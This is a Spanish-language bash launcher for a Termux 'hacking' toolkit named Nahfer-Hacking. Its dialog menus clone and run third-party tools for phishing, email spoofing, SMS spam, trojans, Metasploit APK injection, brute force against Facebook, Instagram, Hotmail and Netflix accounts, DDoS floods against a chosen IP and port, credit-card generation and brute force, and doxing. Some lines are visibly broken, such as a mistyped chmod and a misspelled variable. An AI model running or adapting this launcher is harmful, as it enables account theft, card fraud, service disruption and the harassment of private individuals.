#!/bin/bash
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
clear
####№#########№#################################################################################
version=$"Nahfer-hacking v6.1.0"
#VARIABLES:
DIALOG=${DIALOG=dialog}
SHOW_REGISTER="True"

if [[ -f "GZ7/goblin_variables" && -f "GZ7/goblin_functions" ]]; then
    source GZ7/goblin_variables
    source GZ7/goblin_functions
else
    echo "[ERROR]: ! files ..."
    echo "";exit 0
fi

if [[ -f "$config_directory/nahfer.conf" ]]; then
    source "$config_directory/nahfer.conf"
else
    file_not_found "nahfer.conf"
fi

if [[ ! -d "$log_directory" ]]; then
    mkdir "$log_directory"
fi

if [[ ! -d "$tmp_directory" ]]; then
    mkdir "$tmp_directory"
fi

source $colors
export DIALOGRC=$config_directory/.dialog.conf

#CTRL+C
trap ctrl_c INT

function ctrl_c(){
echo $(clear)                                                 rm -rf tmp/* 2>/dev/null                                      rm -rf logs/* 2>/dev/null
echo "Program aborted."
# tput cnorm
echo "";exit 1
}
# menu ejemplo en dialog
####№#########№#################################################################################
clear

dialog --infobox "iniciando Consola..." 0 0 ; sleep 2

for i in $(seq 0 30 100)
do
    sleep 2
    echo $i | dialog --gauge "loading..." 10 70 0
done

dialog --title "INFORMACION" --infobox "NAHFER HACKING ES UNA HERRAMIENTA DE HACKING
QUE NOS OFRECE VARIAS CATEGORIAS DE HERRAMIENTAS DE HACKING.

CREADOR DEL SCRIPT: CAPITAN COMANDO.

NAHFER-HACKING: VERSION: 6.1.0" 10 50
sleep 5

#############################################


function web_craping(){
    menu_web_craping=$($DIALOG --stdout --help-button --item-help \
        --ok-label "Select" --cancel-label "Exit" \
        --backtitle "$program_name" \
        --title "MAIN-MENU" \
        --menu "$version" 20 60 20 \
        "1" "Cabezeras HTTP Headers         [ Hacking       ]" "cabezeras http." \
        "2" "Robots.txt.                    [ New tool      ]" "Robots.txt" \
        "3" "List Subdominios,extraer links [ Audio/Video   ]" "List Subdominios,extraer links." \
        "4" "Puertos.                       [ File Digger   ]" "Puertos.." \
        "5" "Whois.                         [ Port scan     ]" "Whois." \
        "6" "Dominio a IP                   [ converter     ]" "Dominio a IP" \
        "7" "web Craping                    [ Information   ]" "web Craping" \
        "8" "Scanner web avanzado.          [ Information   ]" "Scanner web avanzado." \
        "9" "extras.                        [ Information   ]" "extras" \
        "10" "Descargar web completa.        [ Port scan     ]" "Descargar web completa." \
        "11" "RED_HAWK                       [ converter     ]" "RED_HAWK")

chosen=$?

case $chosen in
    0)
        echo $(clear)

          if [[ $menu_web_craping == 1 ]]; then
				read -p $'Inserta una web\t[\033[0;37m\033[5m?\033[0m\033[0m] : ' web
				curl -I $web 2> /dev/null > $web.txt 
				cat $web.txt; sleep 0.6s
				echo -e "\n${verde}[${blanco}*${verde}] ${blanco}Se ha guardado el resultado en la carpeta tmp${final}"; sleep 0.9s;
echo $web >>$web.txt
echo
echo "CLICK ENTER PARA CONTINUAR."
read
dialog --title "EXTRAIDO" --textbox $web.txt 0 0
mv $web.txt $HOME/Central-Nahfer/tmp
		elif [[ $menu_web_craping == 2 ]]; then
				read -p $'\nInserta una web\t[\033[0;37m\033[5m?\033[0m\033[0m] : ' web
				curl -L $web/robots.txt 2> /dev/null | sort >> $web.txt
				cat $web.txt; sleep 0.9s
				echo -e "\n${verde}[${blanco}*${verde}] ${blanco}Se ha guardado en raíz${final}"
echo $web >>$web.txt
echo 
echo "CLICK ENTER PARA CONTINUAR."
read
dialog --title "EXTRAIDO" --textbox $web.txt 0 0
mv $web.txt $HOME/Central-Nahfer/tmp
elif [[ $menu_web_craping == 5 ]]; then
echo $web >>$web.txt
				read -p $'\nInserta Una Web o IP\t[\033[0;37m\033[5m?\033[0m\033[0m] : ' web
				curl https://api.hackertarget.com/whois/?q=$web 2> /dev/null >> $web.txt; cat $web.txt
				echo -e "\n${verde}[${blanco}*${verde}] ${blanco}Se ha guardado en raíz${final}"; sleep 0.9s
echo 
echo "CLICK ENTER PARA CONTINUAR."
read
dialog --title "EXTRAIDO" --textbox $web.txt 0 0
mv $web.txt $HOME/Central-Nahfer/tmp
elif [[ $menu_web_craping == 6 ]]; then
				banner
				read -p $'Inserta una web\t[\033[0;37m\033[5m?\033[0m\033[0m] : ' webip
ping $webip
				host $webip  2> /dev/null > $webip.txt; sleep 0.9s; cat $webip.txt		
	echo -e "\n${verde}[${blanco}*${verde}] ${blanco}Se ha guardado en raíz${final}"
echo $webip >>$webip.txt
echo 
echo "CLICK ENTER PARA CONTINUAR."
read
dialog --title "EXTRAIDO" --textbox $webip.txt 0 0
mv $webip.txt $HOME/Central-Nahfer/tmp
elif [[ $menu_web_craping == 3 ]]; then
				read -p $'Inserta una web\t[\033[0;37m\033[5m?\033[0m\033[0m] : ' subdomain
				contador=1
				echo -e "\n\t${rojo}Lista de subdominios: \n" > $subdomain.txt
				curl https://api.hackertarget.com/hostsearch/?q=$subdomain 2> /dev/null | sort | uniq -u | while read linea; do
				echo -e "${verde}[${blanco}*${verde}] ${final}${rojo}Subdominio${final} $contador: $linea"  >> $subdomain.txt
				let contador+=1; done
				echo -e "\n\n\t${rojo}Lista de paginas extraidas: ${final}\n\n" >> $subdomain.txt
				curl https://api.hackertarget.com/pagelinks/?q=$subdomain 2> /dev/null | sort | uniq -u |  while read linea2; do
				echo -e "${verde}[${blanco}*${verde}] ${final}${rojo}PAG. ${final}Extraida $contador: $linea2" >>  $subdomain.txt
				let contador+=1; done
				cat $subdomain.txt
				echo -e "\n${verde}[${blanco}*${verde}]${final} EL proceso se llevo con exito, se ha guardado en raiz${final}"
				sleep 1.0s
echo $sudomain >>$sudomain.txt
echo 
echo "CLICK ENTER PARA CONTINUAR."
read
dialog --title "EXTRAIDO" --textbox $subdomain.txt 0 0
mv $sudomain.txt $HOME/Central-Nahfer/tmp
elif [[ $menu_web_craping == 4 ]]; then
				banner
				read -p $'Inserta Una Web. [\033[0;37m\033[5m?\033[0m\033[0m] : ' port
				echo -e "${rojo}Los puertos encontrados son:${final} " >> $port.txt
				curl https://api.hackertarget.com/nmap/?q=$port 2> /dev/null >> $port.txt
				sleep 1.0s; cat $port.txt
				echo -e "\n${verde}[${blanco}*${verde}]${final} EL proceso se llevo con exito, se ha guardado en raiz${final}"
echo $port >>$port.txt
echo 
echo "CLICK ENTER PARA CONTINUAR."
read
dialog --title "EXTRAIDO" --textbox $port.txt 0 0
mv $port.txt $HOME/Central-Nahfer/tmp
elif [[ $menu_web_craping == 7 ]]; then
cd /data/data/com.termux/files/home/Central-Nahfer/datos/scripts/webcraping/herramientas
python2 Real-DNS

 elif [[ $menu_web_craping == 8 ]]; then                        

                         cd /data/data/com.termux/files/home/Central-Nahfer/datos/scripts/scanneos-web/ejecutables
                         bash scanneos-web.sh			

elif [[ $menu_web_craping == 10 ]]; then
descargar_web

elif [[ $menu_web_craping == 11 ]]; then
git clone https://github.com/MohammedAlsubhi/RED_HAWK.git
cd RED_HAWK
php rhawk.php

         else
            echo "exit"
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        ;;

esac
}

function herramientas_parte_1(){
herramientas=$(dialog --stdout --help-button --item-help \
        --ok-label "Select" --cancel-label "Exit" \
        --backtitle "Nahfer-Hacking" \
        --title "Herramientas" \
        --menu "Version $version" 15 51 6 \
        "1" "Herramientas locales [ Tools-Local    ]" "este es el contacto del creador." \
        "2" "Descargador Tools    [ Downloand Tools]" "son herramientas de termux." \
        "3" "Descargador Firmware [ Downloand sist ]" "aqui hay variedades de herramientas universales." )

chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $herramientas == 1 ]]; then
locales-tools
        elif [[ $herramientas == 2 ]]; then
principio
        elif [[ $herramientas == 3 ]]; then
principio

        else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
function principio(){
menuitem=$(dialog --stdout --help-button --item-help \
        --ok-label "Select" --cancel-label "Exit" \
        --backtitle "Nahfer-Hacking" \
        --title "Central-Nahfer" \
        --menu "Version $version" 15 51 6 \
        "1" "Contacto            [ Contact       ]" "este es el contacto del creador." \
        "2" "Termux-Tools        [ Termux-Tools  ]" "son herramientas de termux." \
        "3" "Nahfer-Hacking      [ Linux hacking ]" "aqui hay variedades de herramientas universales." \
        "4" "Herramientas        [ Herramientas  ]" "herramientas extras." \
        "5" "Goblin-Z7           [ goblin-z7     ]" "goblin." \
        "6" "ajustes             [ Settings      ]" "Configuration and configuraciones" )

chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $menuitem == 1 ]]; then
         echo "esta opcion no esta disponible por el momento"
echo "muy pronto"
sleep 3
principio
        elif [[ $menuitem == 2 ]]; then
          cd $HOME/Central-Nahfer/.config/datos/scripts/Nahfer-Tools
bash Nahfer-Tools.sh
        elif [[ $menuitem == 3 ]]; then
universal1
        elif [[ $menuitem == 4 ]]; then
herramientas_parte_1
       elif [[ $menuitem == 5 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/
git clone https://github.com/Z3R07-RED/Goblin-Z7.git
cd Goblin-Z7
chmod +x goblin-z7.sh
./goblin-z7.sh
       elif [[ $menuitem == 6 ]]; then
mi_ajustes
        else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
############### THEMAS DIALOG FONDO ####################


function themas_dialog_ventana(){
    dialogos=$(dialog --backtitle "THEMAS DE NAHFER HACKING." --stdout --title "THEMAS DIALOG." \
     --menu "" 20 51 9 \
     1 "AMARILLO Y NEGRO." \
     2 "ROJO Y NEGRO" \
     3 "AZUL Y NEGRO" \
     4 "CYAN Y NEGRO." \
     5 "MAGENTA Y NEGRO." \
     6 "VERDE Y NEGRO." \
     7 "BLANCO Y NEGRO."\
     8 "BLUE POWER." \
     9 "RED POWER" \
     10 "DANGER 07" \
     11 "WGREEN." \
     12 "MIXED RED." \
     13 "MIXED RED02." \
     14 "NORMAL."\
     15 "VOLVER ATRAS.")

 chosen=$?

 case $chosen in
     0)
         echo $(clear)
         if [[ $dialogos == 1 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv yellowblack.txt .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf yellowblack.txt 
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 2 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv redblack.txt .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf redblack.txt
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 3 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv blueblack.txt .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf blueblack.txt
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 4 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv cyanblack.txt .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf cyanblack.txt
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 5 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv magentablack.txt .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf magentablack.txt
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 6 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv greenblack.txt  .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf greenblack.txt 
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 7 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv whiteblack.txt .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf whiteblack.txt
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 8 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv BluePower.conf .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf BluePower.conf
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 9 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv RedPower.conf .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf RedPower.conf
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 10 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv danger07.conf .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf danger07.conf
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 11 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv WGreen.conf .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf WGreen.conf
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 12 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv MixedRed.conf .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf MixedRed.conf
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 13 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv MixedRed02.conf .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf MixedRed02.conf
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 14 ]]; then
cd $HOME/Central-Nahfer/.config
rm .dialog.conf
cd $HOME/Central-Nahfer/.config/dialog-theme
mv dialogrc.conf .dialog.conf
cp .dialog.conf $HOME/Central-Nahfer/.config
cd $HOME/Central-Nahfer/.config/dialog-theme
mv .dialog.conf dialogrc.conf
cd ..
cd ..
source /.config/.dialog.conf
themas_dialog_ventana
elif [[ $dialogos == 15 ]]; then
mi_ajustes
else
             echo "exit"
             exit 0
         fi
         ;;
     1)
         echo "cancelado .."
         ;;
     255)
         echo ""
         echo $(clear);exit 1
         ;;

esac
}

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


#####funcion
# Aqui comienza el menu Nahfer Hacking
clear
###########################################################################
function esta_funcion(){
menuholehe=$(dialog --backtitle "NAHFER HACKING" --stdout --title "OSIF SITIES PHONE MAIL" \
    --menu "" 15 51 6 \
    1 "INSTALACION." \
    2 "HERRAMIENTA" \
    3 "Volver atras" )
chosen=$?

case $chosen in
    0)
        echo $(clear)
         if [[ $menuholehe == 1 ]]; then
pkg install holehe -y
sleep 2.0
setterm -foreground red
echo "Pulsa enter para volver atras"
read
esta_funcion
        elif [[ $menuholehe == 2 ]]; then
extractorholehe
        elif [[ $menuholehe == 3 ]]; then
menu_principal
        else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;
esac
}
function extractorholehe(){
HOLA=$(dialog --stdout --title "NAHFER HACKING" --inputbox "Escribe el mail o numero para saber a que sitios esta vinculado." 15 71)

dialog --title "extractor info sities mail phone" \
      --prgbox "holehe --only --used $HOLA" 15 61
}
#######################################################################
function acortador_tinity(){
HOLA=$(dialog --stdout --title "ACORTADOR" --inputbox "Escribe una url para acortar" 15 71)

dialog --title "ACORTADOR V3" \
      --prgbox "curl -s http://tinyurl.com/api-create.php?url=$HOLA" 15 61
}

function descargar_web () {
WEBDESCARGADOR=$(dialog --stdout --title "DESCARGAR WEB" --inputbox "Escribe una url para descargar" 15 71)

dialog --title "DESCARGAR WEB ULTIMATE" \
      --prgbox " wget --limit-rate=100k --no-clobber --convert-links --random-wait -r -p -E -e robots=off -U mozilla $WEBDESCARGADOR" 15 71
}
#########SEGUNDO MENU-2-INGENIERIA SOCIAL###############
function mi_funcion(){
menuitem=$(dialog --backtitle "NAHFER HACKING" --stdout --title "PIRATERIA HACKING" \
    --menu "" 20 51 20 \
    1 "Phishing" \
    2 "Acortador De URL" \
    3 "Enviar Correo" \
    4 "Susplantador de Correos" \
    5 "Correos Temporales" \
    6 "Rastrear IP" \
    7 "Ataque spam SMS" \
    9 "Scannear Numero" \
   10 "extraer sitios de un mail o numero" \
   11 "Troyanos" \
   12 "Inyeccion apk Metasploit")
chosen=$?

case $chosen in
    0)
        echo $(clear)
          if [[ $menuitem == 1 ]]; then
mis_phishing
        elif [[ $menuitem == 2 ]]; then
acortador_tinity
        elif [[ $menuitem == 3 ]]; then
            echo "muy pronto"
        elif [[ $menuitem == 4 ]]; then
cd $HOME/Central-Nahfer/datos/scripts/SuMail
chmo 777 SuMail.sh
bash SuMail.sh
        elif [[ $menuitem == 5 ]]; then
        w3m https://tempail.com/es/
        elif [[ $menuitem == 6 ]]; then
cd $HOME/Central-Nahfer/datos/scripts/ISPLocation
bash ISPLocation.sh
        elif [[ $menuitem == 7 ]]; then
            cd $HOME/Central-Nahfer/datos/scripts/quack
bash SMS.sh
        elif [[ $menuitem == 8 ]]; then
ls
        elif [[ $menuitem == 9 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/PhoneScanner/
bash PhoneScanner.sh
        elif [[ $menuitem == 10 ]]; then 
cd $HOME/Central-Nahfer/.config/datos/scripts
git clone https://github.com/capitancomando/holehe-sites
cd holehe-sites
bash install.sh
bash holehe.sh
        elif [[ $menuitem == 11 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts
bash troyanos.sh
        elif [[ $menuitem == 12 ]]; then
cd $HOME/Central-Nahfer/datos/scripts/sh
bash Payloands.sh
   else
echo "exit"
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac

}
#############-MENU-3-FUERZA BRUTA##########
function mi_funcion_jaja(){
menuitem=$(dialog --backtitle "NAHFER HACKING" --stdout --title "PIRATERIA HACKING" \
    --menu "" 20 51 12 \
   1 "List force brute" \
   2 "Multi brute" \
   3 "Facebook Fuerza Bruta 1" \
   4 "Facebook Fuerza Bruta 2" \
   5 "Instagram Fuerza Bruta 1" \
   6 "Instagram Fuerza Bruta 2" \
   7 "Twiter Fuerza Bruta" \
   8 "Gmail Fuerza Bruta" \
   9 "Hotmail Fuerza Bruta" \
  10 "Yahoo Fuerza Bruta" \
  11 "Fuerza Bruta Netflix" \
  12 "Volver al Menu anterior")
chosen=$?

case $chosen in

    0)
        echo $(clear)
        
        if  [[ $menuitem == 1 ]]; then
generator_list
        elif [[ $menuitem == 2 ]]; then
cd $HOME/Central-Nahfer/datos/scripts/multi-brute
bash cracker.sh
        elif [[ $menuitem == 3 ]]; then
cd $HOME/Central-Nahfer/datos/scripts/Brute_Force
git clone https://github.com/capitancomando/Facebook-FBnahfer.git
cd Facebook-FBnahfer
chmod 711 Facebook-FBnahfer.py
python2 Facebook-FBnahfer.py
        elif [[ $menuitem == 4 ]]; then
     echo "muy pronto"
sleep 2
mi_funcion_jaja
        elif [[ $menuitem == 5 ]]; then 
cd datos/scripts/force_brute/instahackbrute/
sudo bash instahackbrute.sh
       elif [[ $menuitem == 6 ]]; then
echo "muy pronto"
sleep 2
mi_funcion_jaja
      elif [[ $menuitem == 7 ]]; then
     echo "muy pronto"
sleep 2
mi_funcion_jaja
      elif [[ $menuitem == 8 ]]; then
   echo "muy pronto"
mi_funcion_jaja
      elif [[ $menuitem == 9 ]]; then
cd $HOME/Central-Nahfer/datos/scripts/Brute_Force
bash hotmail.sh
      elif [[ $menuitem == 10 ]]; then
echo "muy pronto"
mi_funcion_jaja
      elif [[ $menuitem == 11 ]]; then
cd $HOME/Central-Nahfer/datos/scripts/Brute_Force
bash netflix.sh
      sleep 2
mi_funcion_jaja
     elif [[ $menuitem == 12 ]]; then
menu_principal


      fi
         ;;
      1)
          echo "cancelado .."
          ;;
     255)
          echo ""
         echo $(clear);exit 1
         ;;

 esac
}

function generator_list(){
cd $HOME/Central-Nahfer/.config/datos/scripts/force_brute/list_generator
chmod 777 menu_main.xox
    list_menu=$($DIALOG --stdout --help-button --item-help \
        --ok-label "Select" --cancel-label "Volver" \
        --backtitle "Nahfer-Hacking" \
        --title "listas para fuerza bruta" \
        --menu "$version" 15 51 6 \
        "1" "Crear Personalizable.[ force brute   ]" "AQUI PUEDES PERSONALIZAR TU DICCIONARIO." \
        "2" "Crear a numeros.     [ force brute   ]" "AQUI PUEDES CREAR DICCIONARIOS CON NUMEROS RANDOMS." \
        "3" "Crear a caracteres.  [ force brute   ]" "AQUI PUEDES CREAR DICCIONARIOS CON SIMBOLOS Y CARACTERES." \
        "4" "listas ya creadas.   [ force brute   ]" "AQUI HAY LISTAS DE DICCIONARIOS YA CREADOS POR DEFECTO.")

chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $list_menu == 1 ]]; then
bash menu_main.xox
        elif [[ $list_menu == 2 ]]; then
bash menu_main2.xox
        elif [[ $list_menu == 3 ]]; then
bash menu_main3.xox
        elif [[ $list_menu == 3 ]]; then
bash menu_main4.xox
        else
            echo "exit"
        fi
        ;;
    1)
       menu_principal
        ;;
    255)
        echo ""
        ;;

esac
}

###########-MENU-4 ATAQUES--#########
function ataques_ddos(){
menuitem=$(dialog --backtitle "NAHFER HACKING" --stdout --title "PIRATERIA HACKING" \
    --menu "" 15 51 8 \
    1 "DDOS ANONYMOUS" \
    2 "DDOS HAMMER" \
    3 "DDOS HULK" \
    4 "DDOS NAHFER" \
    5 "DDOS NAHFER V5" \
    6 "DDOS ATACK" \
    7 "DDOS DRIPPER" \
    8 "VOLVER")

chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $menuitem == 1 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/ddos/
git clone https://github.com/M0HAM3D/DDos-Anonymous
cd DDos-Anonymous
IPWEB=$(dialog --stdout --title "IP" --inputbox "Escribe una ip." 15 71)
PORTS=$(dialog --stdout --title "PUERTO" --inputbox "Escribe un puerto para atacar." 15 71)
PACKET=$(dialog --stdout --title "PAQUETES" --inputbox "Escribe cantidad de packets" 15 71)
python2 DDos-Anonymous.py $IPWEB $PORTS $PACKET

        elif [[ $menuitem == 2 ]]; then
nahfer
        elif [[ $menuitem == 3 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/ddos/
git clone https://github.com/Mr4FX/Hulk-ddos-attack
cd Hulk-ddos-attack
chmod +x hulk.py
python hulk.py
        elif [[ $menuitem == 4 ]]; then
nahfer
        elif [[ $menuitem == 5 ]]; then
nahfer
        elif [[ $menuitem == 6 ]]; then
nahfer
        elif [[ $menuitem == 7 ]]; then
nahfer
        else
            echo "menu_principal"
            menu_principal 0
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
##############-----##############
function carding(){
source $HOME/Central-Nahfer/.config/.dialog.conf
cd $HOME/Central-Nahfer/.config/datos
    main_menu=$($DIALOG --stdout --help-button --item-help \
        --ok-label "Select" --cancel-label "Volver" \
        --backtitle "Nahfer-Hacking" \
        --title "Carding Jeffry" \
        --menu "$version" 15 51 6 \
        "1" "Generador de CC     [ Mediante bin   ]" "Generador de cc." \
        "2" "Informacion de BIN  [ Extrae info bin]" "extrae info de un bin." \
        "3" "Extrapolacion       [ Extrapolacion  ]" "extraer bin de tarjeta real." \
        "4" "FuerzaBruta         [ A tarjetas CC  ]" "fuerza bruta a tarjetas cc." \
        "5" "IpTracker           [ Trackear ip    ]" "trackear ip" \
        "6" "Correos temporales  [ TempMail       ]" "correos temporales")

chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $main_menu == 1 ]]; then
python3 VittoUWU.py --tool CC-GEN
        elif [[ $main_menu == 2 ]]; then
python3 VittoUWU.py --tool BIN-INFO
        elif [[ $main_menu == 3 ]]; then
bash Extrapolacion.sh
elif [[ $main_menu == 4 ]]; then
python3 FuerzaBruta.py
elif [[ $main_menu == 5 ]]; then
python VittoTracker.py 
elif [[ $main_menu == 6 ]]; then
w3m https://tempail.com
#menu_principal
        else
            echo "exit"
        fi
        ;;
    1)
       menu_principal
        ;;
    255)
        echo ""
        ;;

esac
}
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

###################AJUSTES-##########################
function mi_ajustes(){
sleep 1
ajustes=$(dialog --backtitle "NAHFER HACKING" --stdout --title "AJUSTES" \
    --menu "" 15 50 5 \
    0 "Actualizar herramienta." \
    1 "Informacion sistem" \
    2 "Sonidos" \
    3 "Temas" \
    4 "Seguridad"\
    5 "Ajustes admi"\
    6 "ATRAS")
chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $ajustes == 0 ]]; then
cp Nahfer-Hacking.sh $HOME
cd $HOME
rm -rf Central-Nahfer
rm Nahfer-Hacking.sh
git clone https://github.com/capitancomando/Central-Nahfer
cd Central-Nahfer
chmod 777 Nahfer-Hacking.sh
bash Nahfer-Hacking.sh       
        elif [[ $ajustes == 1 ]]; then
  neofetch 
echo "CLICK ENTER PARA VOLVER AL MENU PRINCIPAL" | lolcat -a
echo
read
principio
        elif [[ $ajustes == 2 ]]; then
cd $HOME/Central-Nahfer/datos/sonidos
bash sonidos.sh
        elif [[ $ajustes == 3 ]]; then
            menu_temas
        elif [[ $ajustes == 4 ]]; then
            SHOW_REGISTER=""
            source GZ7/.CS07/security/.sec
mi_ajustes
       elif [[ $ajustes == 6 ]]; then
principio
        else
            echo "exit"
        fi
        ;;
    1)
        ;;
    255)
        echo ""
            ;;

esac
}
#########################################################
function menu_temas(){
thema_menu=$(dialog --backtitle "NAHFER HACKING" --stdout --title "PIRATERIA HACKING" \
    --menu "" 15 51 6 \
    1 "Banner" \
    2 "Ventana" \
    3 "Volver Atras.")

chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $thema_menu == 1 ]]; then
#cd $HOME/Central-Nahfer/datos/scripts/sh
#           bash userbanner.sh 
menu_temas
        elif [[ $thema_menu == 2 ]]; then
            themas_dialog_ventana
        elif [[ $thema_menu == 3 ]]; then
             mi_ajustes
        else
            echo "exit"
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        ;;

esac


}
########################################################
function mi_doxing(){
clear

doxeos=$(dialog --backtitle "NAHFER HACKING" --stdout --title "DOXING." \
    --menu "" 15 51 6 \
    0 "Crear Plantilla" \
    1 "DoxTracker." \
    2 "Garuda doxing." \
    3 "Doxing-Error404." \
    4 "Doxing." \
    5 "Doxing 2." \
    6 "Doxweb." \
    7 "Doxtracker." \
    8 "DoxingFramework."\
    9 "VOLVER ATRAS.")
chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $doxeos == 0 ]]; then
ls
        elif [[ $doxeos == 1 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/doxing/
git clone https://github.com/Pericena/Doxinfo
python2 Doxtracker.py
        elif [[ $doxeos == 2 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/doxing/
git clone https://github.com/Cryptonian007/Garuda
cd Garuda
python3 garuda.py
        elif [[ $doxeos == 3 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/doxing/
git clone https://github.com/error404-notfound/Doxing-Error404
python2 doxingE404.py
        elif [[ $doxeos == 4 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/doxing/
git clone https://github.com/HackingEnVivo/Doxing
cd Doxing
python2 Doxing.py
        elif [[ $doxeos == 5 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/doxing/Doxing2
python3 Looking_Glass.py2
         elif [[ $doxeos == 6 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/doxing/
git clone https://github.com/Darkmux/DoxWeb
bash DoxWeb.sh 
         elif [[ $doxeos == 7 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/doxing/
git clone https://github.com/KURO-CODE/DoxTracker
